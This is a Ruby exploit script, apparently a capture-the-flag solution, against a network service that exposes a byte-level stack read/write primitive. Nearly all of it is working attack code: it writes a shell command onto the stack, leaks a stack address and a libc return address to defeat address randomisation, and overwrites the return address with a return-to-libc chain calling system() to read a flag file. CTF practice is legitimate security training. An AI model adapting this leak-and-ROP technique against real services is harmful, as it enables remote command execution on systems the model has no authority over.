require 'socket'
require './libronsolve.rb'

# Defined in the challenge
RIGHT = '00'
LEFT  = '01'
PRINT = '10'
WRITE = '11'

# Offsets relative to the start of libc.so
RETURN_ADDRESS = 0x232D5
SYSTEM = 0x4C8C0
EXIT = 0x3BD00
# PRINTF = 0x53F00
# DEBUG = 0x54492
# INFINITE = 0x6EE49

host, port = get_host_port()

# Connect to the server
s = TCPSocket.new(host, port)

# Get the instructions
puts "Instructions: \"#{ [s.gets().gsub(/ /, '')].pack('B*') }\""

# Helper functions
def read_32_bits_left(s)
  c = []
  0.upto(3) do |i|
    s.write(LEFT)
    s.write(PRINT)
    c << (s.read(8).to_i(2) & 0x0FF)
  end

  return c.pack('c*').unpack('V').pop
end

def read_32_bits_right(s)
  c = []
  0.upto(3) do |_|
    s.write(PRINT)
    s.write(RIGHT)
    c << (s.read(8).to_i(2) & 0x0FF)
  end

  return c.pack('c*').unpack('V').pop
end

def write_32_bits_right(s, i)
  [i].pack('V').unpack('c*').each do |b|
    s.write(WRITE + ('%08b' % (b & 0x0FF)))
    s.write(RIGHT)
  end
end

def write_8_bits_right(s, b)
  s.write(WRITE + ('%08b' % (b & 0x0FF)))
  s.write(RIGHT)
end

# Small offset to align us
s.write(RIGHT * 0x3)

# Use some unused stack space to store our command for later
s.write(RIGHT * 1000)

# Write the command to the stack, one byte at a time
COMMAND = "cat /home/ctf/flag.txt\0"
COMMAND.bytes.each do |b|
  write_8_bits_right(s, b)
end

# Go backwards - this rewinds to a point on the stack where we can reliably find
# a stack reference
s.write(LEFT * (1000 + COMMAND.length - 132))

# Read a stack address
STACK_ADDR = read_32_bits_right(s)

# Calculate where our command is, based on the known address and the 1000-byte
# offset
COMMAND_ADDR = STACK_ADDR - 0xc4 + 1000
puts "Command should be @ %x" % COMMAND_ADDR

# Keep progressing up to the return address
s.write(RIGHT * 40)

# Read the original return address, then go back so we can overwrite it
ACTUAL_RETURN_ADDRESS = read_32_bits_right(s)
s.write(LEFT * 4)
puts 'Return address on the stack: %x' % ACTUAL_RETURN_ADDRESS

# Calculate the base address (ie, start of libc) - that'll let us figure out
# where the functions we want are
BASE_ADDRESS = (ACTUAL_RETURN_ADDRESS - RETURN_ADDRESS)
puts 'Base address: %x' % BASE_ADDRESS

# Set up a small ROP chain to call system, then exit
write_32_bits_right(s, BASE_ADDRESS + SYSTEM) # Return address (from main())
write_32_bits_right(s, BASE_ADDRESS + EXIT) # Return address (from system())
write_32_bits_right(s, COMMAND_ADDR) # First argument to system()
write_32_bits_right(s, 0) # Return address (from exit()) - unused
write_32_bits_right(s, 0) # First argument to exit()

# Tell it we're quitting
s.write("q\n")

# Read the flag until we get disconnected
flag = ""
loop do
  a = s.read()
  if a.nil? || a == ''
    break
  end
  flag += a
end

# Validate!
check_flag(flag, terminate: true)
